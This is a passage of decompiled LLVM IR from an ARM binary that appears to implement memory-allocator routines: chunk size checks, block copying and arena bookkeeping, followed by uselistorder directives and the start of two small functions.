dec_label_pc_119fc:                               ; preds = %dec_label_pc_119ec, %dec_label_pc_119f8
  %v1_119fc = phi i32 [ %v3_119e4, %dec_label_pc_119ec ], [ %v1_119fc.pre, %dec_label_pc_119f8 ]
  %v0_119fc = phi i32 [ %v3_119d8, %dec_label_pc_119ec ], [ %v0_119fc.pre, %dec_label_pc_119f8 ]
  %v2_119fc = add i32 %v1_119fc, 8
  %v3_119fc = inttoptr i32 %v2_119fc to i32*
  store i32 %v0_119fc, i32* %v3_119fc, align 4
  %v0_11a00 = load i32, i32* %r2.global-to-local, align 4
  %v1_11a00 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a00 = add i32 %v1_11a00, 12
  %v3_11a00 = inttoptr i32 %v2_11a00 to i32*
  store i32 %v0_11a00, i32* %v3_11a00, align 4
  %v1_11abc.pre = load i32, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11a08:                               ; preds = %dec_label_pc_11978, %dec_label_pc_119c8, %dec_label_pc_119b4
  %v1_11a08 = add i32 %v1_1194c, -7
  store i32 %v1_11a08, i32* %r0.global-to-local, align 4
  %v1_11a0c = call i32 @function_c77c(i32 %v1_11a08)
  store i32 %v1_11a0c, i32* @r0, align 4
  store i32 %v1_11a0c, i32* %r1.global-to-local, align 4
  %v2_11a10 = icmp eq i32 %v1_11a0c, 0
  br i1 %v2_11a10, label %bb31, label %dec_label_pc_11a1c

bb31:                                             ; preds = %dec_label_pc_11a08
  store i32 0, i32* @r4, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11a1c:                               ; preds = %dec_label_pc_11a08
  %v1_11a24.pre = load i32, i32* @r4, align 4
  %v1_11a1c = add i32 %v1_11a0c, -4
  %v2_11a1c = inttoptr i32 %v1_11a1c to i32*
  %v3_11a1c = load i32, i32* %v2_11a1c, align 4
  store i32 %v3_11a1c, i32* %r3.global-to-local, align 4
  %v1_11a20 = add i32 %v1_11a0c, -8
  store i32 %v1_11a20, i32* @r7, align 4
  %v9_11a24 = icmp eq i32 %v1_11a20, %v1_11a24.pre
  br i1 %v9_11a24, label %.thread2, label %dec_label_pc_11a34

.thread2:                                         ; preds = %dec_label_pc_11a1c
  %v2_11a28 = and i32 %v3_11a1c, -4
  store i32 %v2_11a28, i32* %r3.global-to-local, align 4
  %v2_11a2c = load i32, i32* @r6, align 4
  %v3_11a2c = add i32 %v2_11a2c, %v2_11a28
  store i32 %v3_11a2c, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11abc

dec_label_pc_11a34:                               ; preds = %dec_label_pc_11a1c
  %v0_11a34 = load i32, i32* @r6, align 4
  %v1_11a34 = add i32 %v0_11a34, -4
  store i32 %v1_11a34, i32* @r2, align 4
  %v3_11a38 = udiv i32 %v1_11a34, 4
  store i32 %v3_11a38, i32* %ip.global-to-local, align 4
  %tmp37 = and i32 %v1_11a34, -4
  %tmp38 = icmp eq i32 %tmp37, 36
  %v2_11a40 = icmp ult i32 %v1_11a34, 36
  %v3_11a40 = or i1 %tmp38, %v2_11a40
  %v0_11a50 = load i32, i32* @r5, align 4
  br i1 %v3_11a40, label %dec_label_pc_11a50, label %dec_label_pc_11a44

dec_label_pc_11a44:                               ; preds = %dec_label_pc_11a34
  store i32 %v0_11a50, i32* @r1, align 4
  %v0_11a48 = call i32 @function_bfd0()
  store i32 %v0_11a48, i32* %r0.global-to-local, align 4
  br label %.thread6

dec_label_pc_11a50:                               ; preds = %dec_label_pc_11a34
  %v1_11a50 = inttoptr i32 %v0_11a50 to i32*
  %v2_11a50 = load i32, i32* %v1_11a50, align 4
  store i32 %v2_11a50, i32* %r3.global-to-local, align 4
  %v2_11a54 = inttoptr i32 %v1_11a0c to i32*
  store i32 %v2_11a50, i32* %v2_11a54, align 4
  %v0_11a58 = load i32, i32* @r5, align 4
  %v1_11a58 = add i32 %v0_11a58, 4
  %v2_11a58 = inttoptr i32 %v1_11a58 to i32*
  %v3_11a58 = load i32, i32* %v2_11a58, align 4
  store i32 %v3_11a58, i32* %r3.global-to-local, align 4
  %v1_11a5c = load i32, i32* %r1.global-to-local, align 4
  %v2_11a5c = add i32 %v1_11a5c, 4
  %v3_11a5c = inttoptr i32 %v2_11a5c to i32*
  store i32 %v3_11a58, i32* %v3_11a5c, align 4
  %v0_11a60 = load i32, i32* @r5, align 4
  %v1_11a60 = add i32 %v0_11a60, 8
  %v2_11a60 = inttoptr i32 %v1_11a60 to i32*
  %v3_11a60 = load i32, i32* %v2_11a60, align 4
  store i32 %v3_11a60, i32* %r3.global-to-local, align 4
  %v0_11a64 = load i32, i32* %ip.global-to-local, align 4
  %v1_11a68 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a68 = add i32 %v1_11a68, 8
  %v3_11a68 = inttoptr i32 %v2_11a68 to i32*
  store i32 %v3_11a60, i32* %v3_11a68, align 4
  %tmp39 = icmp ult i32 %v0_11a64, 5
  br i1 %tmp39, label %.thread6, label %dec_label_pc_11a70

dec_label_pc_11a70:                               ; preds = %dec_label_pc_11a50
  %v0_11a70 = load i32, i32* @r5, align 4
  %v1_11a70 = add i32 %v0_11a70, 12
  %v2_11a70 = inttoptr i32 %v1_11a70 to i32*
  %v3_11a70 = load i32, i32* %v2_11a70, align 4
  store i32 %v3_11a70, i32* %r3.global-to-local, align 4
  %v1_11a74 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a74 = add i32 %v1_11a74, 12
  %v3_11a74 = inttoptr i32 %v2_11a74 to i32*
  store i32 %v3_11a70, i32* %v3_11a74, align 4
  %v0_11a78 = load i32, i32* @r5, align 4
  %v1_11a78 = add i32 %v0_11a78, 16
  %v2_11a78 = inttoptr i32 %v1_11a78 to i32*
  %v3_11a78 = load i32, i32* %v2_11a78, align 4
  store i32 %v3_11a78, i32* %r3.global-to-local, align 4
  %v0_11a7c = load i32, i32* %ip.global-to-local, align 4
  %v1_11a80 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a80 = add i32 %v1_11a80, 16
  %v3_11a80 = inttoptr i32 %v2_11a80 to i32*
  store i32 %v3_11a78, i32* %v3_11a80, align 4
  %tmp40 = icmp ult i32 %v0_11a7c, 7
  br i1 %tmp40, label %.thread6, label %dec_label_pc_11a88

dec_label_pc_11a88:                               ; preds = %dec_label_pc_11a70
  %v0_11a88 = load i32, i32* @r5, align 4
  %v1_11a88 = add i32 %v0_11a88, 20
  %v2_11a88 = inttoptr i32 %v1_11a88 to i32*
  %v3_11a88 = load i32, i32* %v2_11a88, align 4
  store i32 %v3_11a88, i32* %r3.global-to-local, align 4
  %v1_11a8c = load i32, i32* %r1.global-to-local, align 4
  %v2_11a8c = add i32 %v1_11a8c, 20
  %v3_11a8c = inttoptr i32 %v2_11a8c to i32*
  store i32 %v3_11a88, i32* %v3_11a8c, align 4
  %v0_11a90 = load i32, i32* @r5, align 4
  %v1_11a90 = add i32 %v0_11a90, 24
  %v2_11a90 = inttoptr i32 %v1_11a90 to i32*
  %v3_11a90 = load i32, i32* %v2_11a90, align 4
  store i32 %v3_11a90, i32* %r3.global-to-local, align 4
  %v1_11a94 = load i32, i32* %r1.global-to-local, align 4
  %v2_11a94 = add i32 %v1_11a94, 24
  %v3_11a94 = inttoptr i32 %v2_11a94 to i32*
  store i32 %v3_11a90, i32* %v3_11a94, align 4
  %v0_11a98 = load i32, i32* %ip.global-to-local, align 4
  %v7_11a98 = icmp eq i32 %v0_11a98, 9
  br i1 %v7_11a98, label %bb32, label %.thread6

bb32:                                             ; preds = %dec_label_pc_11a88
  %v1_11a9c = load i32, i32* @r5, align 4
  %v2_11a9c = add i32 %v1_11a9c, 28
  %v3_11a9c = inttoptr i32 %v2_11a9c to i32*
  %v4_11a9c = load i32, i32* %v3_11a9c, align 4
  store i32 %v4_11a9c, i32* %r3.global-to-local, align 4
  %v2_11aa0 = load i32, i32* %r1.global-to-local, align 4
  %v3_11aa0 = add i32 %v2_11aa0, 28
  %v4_11aa0 = inttoptr i32 %v3_11aa0 to i32*
  store i32 %v4_11a9c, i32* %v4_11aa0, align 4
  %v1_11aa4 = load i32, i32* @r5, align 4
  %v2_11aa4 = add i32 %v1_11aa4, 32
  %v3_11aa4 = inttoptr i32 %v2_11aa4 to i32*
  %v4_11aa4 = load i32, i32* %v3_11aa4, align 4
  store i32 %v4_11aa4, i32* %r3.global-to-local, align 4
  %v2_11aa8 = load i32, i32* %r1.global-to-local, align 4
  %v3_11aa8 = add i32 %v2_11aa8, 32
  %v4_11aa8 = inttoptr i32 %v3_11aa8 to i32*
  store i32 %v4_11aa4, i32* %v4_11aa8, align 4
  br label %.thread6

.thread6:                                         ; preds = %dec_label_pc_11a88, %dec_label_pc_11a70, %dec_label_pc_11a50, %dec_label_pc_11a44, %bb32
  %v0_11aac = load i32, i32* @r5, align 4
  store i32 %v0_11aac, i32* @r0, align 4
  %v0_11ab0 = call i32 @function_d458()
  store i32 %v0_11ab0, i32* %r0.global-to-local, align 4
  %v0_11ab4 = load i32, i32* @r7, align 4
  %v1_11ab4 = add i32 %v0_11ab4, 8
  store i32 %v1_11ab4, i32* @r4, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11abc:                               ; preds = %bb30, %.thread2, %dec_label_pc_119fc
  %v0_11ad0 = phi i32 [ %v3_11a2c, %.thread2 ], [ %v1_11944, %bb30 ], [ %v1_11abc.pre, %dec_label_pc_119fc ]
  %v0_11abc = load i32, i32* @sb, align 4
  %v2_11abc = sub i32 %v0_11ad0, %v0_11abc
  store i32 %v2_11abc, i32* %r1.global-to-local, align 4
  %v0_11ac4 = load i32, i32* @sl, align 4
  %v1_11ac4 = add i32 %v0_11ac4, 4
  %v2_11ac4 = inttoptr i32 %v1_11ac4 to i32*
  %v3_11ac4 = load i32, i32* %v2_11ac4, align 4
  %tmp41 = icmp ugt i32 %v2_11abc, 15
  %v1_11aec = urem i32 %v3_11ac4, 2
  store i32 %v1_11aec, i32* %r3.global-to-local, align 4
  br i1 %tmp41, label %dec_label_pc_11aec, label %dec_label_pc_11acc

dec_label_pc_11acc:                               ; preds = %dec_label_pc_11abc
  %v2_11ad0 = or i32 %v1_11aec, %v0_11ad0
  store i32 %v2_11ad0, i32* %r3.global-to-local, align 4
  store i32 %v2_11ad0, i32* %v2_11ac4, align 4
  %v0_11ad8 = load i32, i32* @sl, align 4
  %v1_11ad8 = load i32, i32* %r0.global-to-local, align 4
  %v2_11ad8 = add i32 %v1_11ad8, %v0_11ad8
  store i32 %v2_11ad8, i32* %r2.global-to-local, align 4
  %v1_11adc = add i32 %v2_11ad8, 4
  %v2_11adc = inttoptr i32 %v1_11adc to i32*
  %v3_11adc = load i32, i32* %v2_11adc, align 4
  %v1_11ae0 = or i32 %v3_11adc, 1
  store i32 %v1_11ae0, i32* %r3.global-to-local, align 4
  store i32 %v1_11ae0, i32* %v2_11adc, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11aec:                               ; preds = %dec_label_pc_11abc
  %v2_11af0 = add i32 %v0_11ac4, %v0_11abc
  store i32 %v2_11af0, i32* %r0.global-to-local, align 4
  %v2_11af4 = or i32 %v1_11aec, %v0_11abc
  store i32 %v2_11af4, i32* %r3.global-to-local, align 4
  %v1_11af8 = or i32 %v2_11abc, 1
  store i32 %v1_11af8, i32* %r2.global-to-local, align 4
  store i32 %v2_11af4, i32* %v2_11ac4, align 4
  %v0_11b00 = load i32, i32* %r2.global-to-local, align 4
  %v1_11b00 = load i32, i32* %r0.global-to-local, align 4
  %v2_11b00 = add i32 %v1_11b00, 4
  %v3_11b00 = inttoptr i32 %v2_11b00 to i32*
  store i32 %v0_11b00, i32* %v3_11b00, align 4
  %v0_11b04 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b04 = load i32, i32* %r1.global-to-local, align 4
  %v2_11b04 = add i32 %v1_11b04, %v0_11b04
  store i32 %v2_11b04, i32* %r2.global-to-local, align 4
  %v1_11b08 = add i32 %v2_11b04, 4
  %v2_11b08 = inttoptr i32 %v1_11b08 to i32*
  %v3_11b08 = load i32, i32* %v2_11b08, align 4
  %v1_11b0c = or i32 %v3_11b08, 1
  store i32 %v1_11b0c, i32* %r3.global-to-local, align 4
  store i32 %v1_11b0c, i32* %v2_11b08, align 4
  %v0_11b14 = load i32, i32* %r0.global-to-local, align 4
  %v1_11b14 = add i32 %v0_11b14, 8
  store i32 %v1_11b14, i32* @r0, align 4
  %v0_11b18 = call i32 @function_d458()
  store i32 %v0_11b18, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11b1c

dec_label_pc_11b1c:                               ; preds = %dec_label_pc_11acc, %dec_label_pc_11aec
  %v0_11b1c = load i32, i32* @sl, align 4
  %v1_11b1c = add i32 %v0_11b1c, 8
  store i32 %v1_11b1c, i32* @r4, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11b24:                               ; preds = %bb29
  store i32 64, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r1.global-to-local, align 4
  %v4_11b2c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), align 4
  store i32 %v4_11b2c, i32* @r8, align 4
  %v2_11b30 = inttoptr i32 %v1_11940 to i32*
  %v3_11b30 = load i32, i32* %v2_11b30, align 4
  store i32 %v3_11b30, i32* @r4, align 4
  %v1_11b34 = add i32 %v4_11b2c, 860
  %v2_11b34 = inttoptr i32 %v1_11b34 to i32*
  %v3_11b34 = load i32, i32* %v2_11b34, align 4
  %v1_11b38 = add i32 %v3_11b30, 4
  %v1_11b3c = add i32 %v3_11b34, -1
  store i32 %v1_11b3c, i32* %r2.global-to-local, align 4
  %v2_11b40 = add i32 %v1_11b38, %v1_11b3c
  %v1_11b44 = load i32, i32* @sb, align 4
  %v2_11b44 = add i32 %v2_11b40, %v1_11b44
  store i32 %v2_11b44, i32* %r3.global-to-local, align 4
  %v2_11b48 = sub i32 0, %v3_11b34
  %v3_11b48 = and i32 %v2_11b44, %v2_11b48
  store i32 %v3_11b48, i32* @r7, align 4
  %v2_11b4c = sub i32 %v3_11b48, %v3_11b30
  store i32 %v2_11b4c, i32* @fp, align 4
  %v9_11b50 = icmp eq i32 %v1_11944, %v2_11b4c
  br i1 %v9_11b50, label %dec_label_pc_11bc4, label %dec_label_pc_11b58

dec_label_pc_11b58:                               ; preds = %dec_label_pc_11b24
  %v2_11b58 = sub i32 %v1_11940, %v3_11b30
  store i32 %v2_11b58, i32* %r0.global-to-local, align 4
  %v2_11b5c = add i32 %v3_11b30, %v1_11944
  store i32 %v2_11b5c, i32* %r1.global-to-local, align 4
  store i32 %v3_11b48, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  %v4_11b68 = call i32 @function_12150(i32 %v2_11b58, i32 %v2_11b5c, i32 %v3_11b48, i32 1)
  store i32 %v4_11b68, i32* %r0.global-to-local, align 4
  %v7_11b6c = icmp eq i32 %v4_11b68, -1
  br i1 %v7_11b6c, label %dec_label_pc_11bb8, label %dec_label_pc_11b74

dec_label_pc_11b74:                               ; preds = %dec_label_pc_11b58
  %v1_11b74 = load i32, i32* @r4, align 4
  %v2_11b74 = add i32 %v1_11b74, %v4_11b68
  store i32 %v2_11b74, i32* %r0.global-to-local, align 4
  %v0_11b78 = load i32, i32* @fp, align 4
  %v1_11b78 = or i32 %v0_11b78, 2
  store i32 %v1_11b78, i32* %r3.global-to-local, align 4
  %v2_11b7c = add i32 %v2_11b74, 4
  %v3_11b7c = inttoptr i32 %v2_11b7c to i32*
  store i32 %v1_11b78, i32* %v3_11b7c, align 4
  %v0_11b80 = load i32, i32* @r8, align 4
  %v1_11b80 = add i32 %v0_11b80, 868
  %v2_11b80 = inttoptr i32 %v1_11b80 to i32*
  %v3_11b80 = load i32, i32* %v2_11b80, align 4
  store i32 %v3_11b80, i32* %r3.global-to-local, align 4
  %v1_11b84 = add i32 %v0_11b80, 880
  %v2_11b84 = inttoptr i32 %v1_11b84 to i32*
  %v3_11b84 = load i32, i32* %v2_11b84, align 4
  store i32 %v3_11b84, i32* %r2.global-to-local, align 4
  %v0_11b88 = load i32, i32* @r6, align 4
  %v2_11b88 = sub i32 %v3_11b80, %v0_11b88
  store i32 %v2_11b88, i32* %r3.global-to-local, align 4
  %v1_11b8c = load i32, i32* @r7, align 4
  %v2_11b8c = add i32 %v1_11b8c, %v2_11b88
  store i32 %v2_11b8c, i32* %r1.global-to-local, align 4
  %v1_11b90 = add i32 %v0_11b80, 872
  %v2_11b90 = inttoptr i32 %v1_11b90 to i32*
  %v3_11b90 = load i32, i32* %v2_11b90, align 4
  store i32 %v3_11b90, i32* %r3.global-to-local, align 4
  %v1_11b98 = add i32 %v0_11b80, 884
  %v2_11b98 = inttoptr i32 %v1_11b98 to i32*
  %v3_11b98 = load i32, i32* %v2_11b98, align 4
  store i32 %v3_11b98, i32* %r2.global-to-local, align 4
  %tmp42 = icmp ugt i32 %v2_11b8c, %v3_11b84
  br i1 %tmp42, label %bb33, label %bb34

bb33:                                             ; preds = %dec_label_pc_11b74
  store i32 %v2_11b8c, i32* %v2_11b84, align 4
  %v0_11ba0.pre = load i32, i32* %r1.global-to-local, align 4
  %v1_11ba0.pre = load i32, i32* @r8, align 4
  br label %bb34

bb34:                                             ; preds = %dec_label_pc_11b74, %bb33
  %v1_11ba0 = phi i32 [ %v0_11b80, %dec_label_pc_11b74 ], [ %v1_11ba0.pre, %bb33 ]
  %v0_11ba0 = phi i32 [ %v2_11b8c, %dec_label_pc_11b74 ], [ %v0_11ba0.pre, %bb33 ]
  %v2_11ba0 = add i32 %v1_11ba0, 868
  %v3_11ba0 = inttoptr i32 %v2_11ba0 to i32*
  store i32 %v0_11ba0, i32* %v3_11ba0, align 4
  %v0_11ba4 = load i32, i32* %r1.global-to-local, align 4
  %v1_11ba4 = load i32, i32* %r3.global-to-local, align 4
  %v2_11ba4 = add i32 %v1_11ba4, %v0_11ba4
  store i32 %v2_11ba4, i32* %r1.global-to-local, align 4
  %v1_11ba8 = load i32, i32* %r2.global-to-local, align 4
  %v0_11bac = load i32, i32* %r0.global-to-local, align 4
  %v1_11bac = add i32 %v0_11bac, 8
  store i32 %v1_11bac, i32* @r4, align 4
  %tmp43 = icmp ugt i32 %v2_11ba4, %v1_11ba8
  br i1 %tmp43, label %bb35, label %dec_label_pc_11bf0

bb35:                                             ; preds = %bb34
  %v5_11bb0 = load i32, i32* @r8, align 4
  %v6_11bb0 = add i32 %v5_11bb0, 884
  %v7_11bb0 = inttoptr i32 %v6_11bb0 to i32*
  store i32 %v2_11ba4, i32* %v7_11bb0, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11bb8:                               ; preds = %dec_label_pc_11b58
  %v0_11bb8 = load i32, i32* @sb, align 4
  %v1_11bb8 = add i32 %v0_11bb8, 4
  store i32 %v1_11bb8, i32* %r3.global-to-local, align 4
  %v0_11bbc = load i32, i32* @r6, align 4
  %v3_11bbc = icmp ult i32 %v0_11bbc, %v1_11bb8
  br i1 %v3_11bbc, label %dec_label_pc_11bcc, label %dec_label_pc_11bb8.dec_label_pc_11bc4_crit_edge

dec_label_pc_11bb8.dec_label_pc_11bc4_crit_edge:  ; preds = %dec_label_pc_11bb8
  %v0_11bc4.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_11bc4

dec_label_pc_11bc4:                               ; preds = %dec_label_pc_11bb8.dec_label_pc_11bc4_crit_edge, %dec_label_pc_11b24
  %v0_11bc4 = phi i32 [ %v0_11bc4.pre, %dec_label_pc_11bb8.dec_label_pc_11bc4_crit_edge ], [ %v0_1192c, %dec_label_pc_11b24 ]
  store i32 %v0_11bc4, i32* @r4, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11bcc:                               ; preds = %dec_label_pc_11bb8
  %v1_11bcc = add i32 %v0_11bb8, -7
  store i32 %v1_11bcc, i32* %r0.global-to-local, align 4
  %v1_11bd0 = call i32 @function_c77c(i32 %v1_11bcc)
  store i32 %v1_11bd0, i32* @r0, align 4
  store i32 %v1_11bd0, i32* @r4, align 4
  %v2_11bd4 = icmp eq i32 %v1_11bd0, 0
  br i1 %v2_11bd4, label %dec_label_pc_11bf0, label %dec_label_pc_11bdc

dec_label_pc_11bdc:                               ; preds = %dec_label_pc_11bcc
  %v0_11bdc = load i32, i32* @r6, align 4
  %v1_11bdc = add i32 %v0_11bdc, -8
  store i32 %v1_11bdc, i32* @r2, align 4
  %v0_11be0 = load i32, i32* @r5, align 4
  store i32 %v0_11be0, i32* @r1, align 4
  %v0_11be4 = call i32 @function_bfd0()
  %v0_11be8 = load i32, i32* @r5, align 4
  store i32 %v0_11be8, i32* @r0, align 4
  %v0_11bec = call i32 @function_d458()
  store i32 %v0_11bec, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_11bf0

dec_label_pc_11bf0:                               ; preds = %bb31, %bb35, %bb34, %dec_label_pc_11bcc, %dec_label_pc_11bc4, %dec_label_pc_11b1c, %.thread6, %dec_label_pc_1198c, %dec_label_pc_11bdc
  store i32 %v2_118d8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 44, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32* %r2.global-to-local, align 4
  %v4_11c00 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 44) to i32*), align 4
  store i32 %v4_11c00, i32* %ip.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_11c00)
  br label %dec_label_pc_11c0c

dec_label_pc_11c0c:                               ; preds = %dec_label_pc_1190c, %dec_label_pc_118b4, %dec_label_pc_1189c, %dec_label_pc_11bf0
  %v0_11c0c = load i32, i32* @r4, align 4
  store i32 %v0_11c0c, i32* %r0.global-to-local, align 4
  store i32 %v3_1187c, i32* @r4, align 4
  store i32 %v6_1187c, i32* @r5, align 4
  store i32 %v9_1187c, i32* @r6, align 4
  store i32 %v12_1187c, i32* @r7, align 4
  store i32 %v15_1187c, i32* @r8, align 4
  store i32 %v18_1187c, i32* @sb, align 4
  store i32 %v21_1187c, i32* @sl, align 4
  store i32 %v24_1187c, i32* @fp, align 4
  store i32 %v27_1187c, i32* @lr, align 4
  ret i32 %v0_11c0c

; uselistorder directives
  uselistorder i32 %v2_11ba4, { 1, 0, 2 }
  uselistorder i32 %v2_11b8c, { 1, 2, 0, 3 }
  uselistorder i32 %v4_11b68, { 1, 0, 2 }
  uselistorder i32 %v3_11b48, { 1, 0, 2, 3 }
  uselistorder i32 %v1_11aec, { 2, 1, 0 }
  uselistorder i32 %v2_11abc, { 1, 0, 2 }
  uselistorder i32 %v0_11a50, { 1, 0 }
  uselistorder i32 %v1_11a0c, { 0, 2, 1, 3, 4, 5 }
  uselistorder i32 %v3_11970, { 0, 2, 1, 3 }
  uselistorder i32 %v2_11968, { 1, 2, 3, 0, 4, 5, 6 }
  uselistorder i32 %v1_1194c, { 3, 5, 0, 1, 2, 4, 6 }
  uselistorder i32 %v1_11944, { 0, 7, 5, 1, 2, 3, 4, 6, 8, 9 }
  uselistorder i32 %v1_11940, { 2, 3, 0, 1, 4 }
  uselistorder i1 %v2_11930, { 1, 0 }
  uselistorder i32 %v0_1192c, { 2, 0, 1, 3, 4 }
  uselistorder i32 %v0_11904, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 6, 1, 2, 3, 4, 5, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 40, 38, 39 }
  uselistorder i32* %r1.global-to-local, { 1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 0 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 2, 3, 4, 5, 30, 6, 11, 7, 8, 9, 10, 21, 12, 14, 13, 15, 22, 23, 16, 17, 18, 19, 20, 26, 25, 24, 27, 29, 28 }
  uselistorder i32* %ip.global-to-local, { 0, 1, 2, 3, 4, 5, 6, 8, 7 }
  uselistorder i32 860, { 0, 2, 1, 3 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 64) to i32*), { 3, 2, 17, 7, 8, 9, 10, 11, 6, 12, 5, 13, 0, 14, 15, 4, 16, 1 }
  uselistorder i32 -4, { 2, 17, 39, 40, 41, 42, 43, 44, 45, 18, 60, 61, 62, 3, 19, 20, 21, 63, 64, 65, 4, 22, 23, 24, 66, 67, 68, 5, 25, 26, 69, 16, 15, 70, 71, 72, 14, 13, 12, 11, 27, 28, 29, 30, 31, 6, 32, 7, 33, 8, 34, 73, 10, 35, 36, 47, 48, 49, 9, 50, 51, 52, 37, 46, 0, 1, 53, 54, 55, 56, 57, 58, 59, 38 }
  uselistorder i32 -32, { 0, 3, 2, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 16) to i32*), { 0, 2, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 112) to i32*), { 0, 1, 2, 3, 6, 4, 5 }
  uselistorder i32 112, { 1, 2, 3, 4, 0, 5 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 68) to i32*), { 2, 0, 3, 4, 1 }
  uselistorder i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 108) to i32*), { 1, 0, 2 }
  uselistorder i32 108, { 0, 5, 6, 1, 2, 3, 4 }
  uselistorder i32 ()* @function_d458, { 10, 9, 8, 7, 4, 6, 0, 3, 2, 1, 5 }
  uselistorder i32 (i32)* @function_c77c, { 15, 14, 13, 12, 2, 11, 0, 3, 1, 10, 7, 9, 8, 6, 5, 4 }
  uselistorder i32 %arg2, { 2, 1, 0, 3, 4 }
  uselistorder label %dec_label_pc_11c0c, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_11bf0, { 8, 3, 4, 1, 2, 5, 6, 0, 7 }
  uselistorder label %bb34, { 1, 0 }
  uselistorder label %dec_label_pc_11b1c, { 1, 0 }
  uselistorder label %dec_label_pc_11abc, { 1, 2, 0 }
  uselistorder label %.thread6, { 4, 0, 1, 2, 3 }
  uselistorder label %dec_label_pc_11a08, { 1, 2, 0 }
  uselistorder label %dec_label_pc_119fc, { 1, 0 }
  uselistorder label %dec_label_pc_119f8, { 1, 0 }
  uselistorder label %bb29, { 1, 0 }
  uselistorder label %bb27, { 1, 0 }
}

define i32 @function_11c20(i16* %arg1) local_unnamed_addr {
dec_label_pc_11c20:
  %v0_11c20 = load i1, i1* @cpsr_z, align 1
  br i1 %v0_11c20, label %.thread3, label %.thread5

.thread3:                                         ; preds = %dec_label_pc_11c20
  call void @llvm.trap()
  unreachable

.thread5:                                         ; preds = %dec_label_pc_11c20
  %tmp = ptrtoint i16* %arg1 to i32
  ret i32 %tmp
}

define i32 @function_11c3c() local_unnamed_addr {
dec_label_pc_11c3c:
  %lr.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %stack_var_-16 = alloca i32, align 4
  store i32 72, i32* %r3.global-to-local, align 4
  %v3_11c48 = load i32, i32* @r4, align 4
  store i32 %v3_11c48, i32* %stack_var_-16, align 4
  %v4_11c4c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 72) to i32*), align 4
  store i32 60, i32* %r3.global-to-local, align 4
  %v4_11c54 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 60) to i32*), align 4
  store i32 36, i32* %r3.global-to-local, align 4
  %v4_11c5c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 36) to i32*), align 4
  store i32 %v4_11c5c, i32* %r4.global-to-local, align 4
  store i32 52, i32* %r3.global-to-local, align 4
  %v1_11c64 = inttoptr i32 %v4_11c4c to i32*
  %v2_11c64 = load i32, i32* %v1_11c64, align 4
  %v4_11c68 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 52) to i32*), align 4
  store i32 %v4_11c68, i32* %lr.global-to-local, align 4
  store i32 144, i32* %r3.global-to-local, align 4
  %v1_11c70 = add i32 %v2_11c64, 15
  %v4_11c74 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_1d280.213 to i32), i32 144) to i32*), align 4
  store i32 %v4_11c74, i32* @ip, align 4
  %v1_11c78 = load i32, i32* @r0, align 4
  %v2_11c78 = add i32 %v1_11c78, %v1_11c70
  %v1_11c7c = inttoptr i32 %v4_11c54 to i32*
  %v2_11c7c = load i32, i32* %v1_11c7c, align 4
  store i32 %v2_11c7c, i32* %r3.global-to-local, align 4
  %v1_11c80 = and i32 %v2_11c78, -16
  store i32 %v1_11c80, i32* %v1_11c64, align 4
  %v0_11c88 = load i32, i32* @r0, align 4
  %v1_11c88 = load i32, i32* %r4.global-to-local, align 4
  %v2_11c88 = inttoptr i32 %v1_11c88 to i32*
  store i32 %v0_11c88, i32* %v2_11c88, align 4
  %v0_11c8c = load i32, i32* @r1, align 4
  %v1_11c8c = load i32, i32* %lr.global-to-local, align 4
  %v2_11c8c = inttoptr i32 %v1_11c8c to i32*
  store i32 %v0_11c8c, i32* %v2_11c8c, align 4
  %v0_11c90 = load i32, i32* %r3.global-to-local, align 4
  %v1_11c90 = load i32, i32* @ip, align 4
  %v2_11c90 = inttoptr i32 %v1_11c90 to i32*
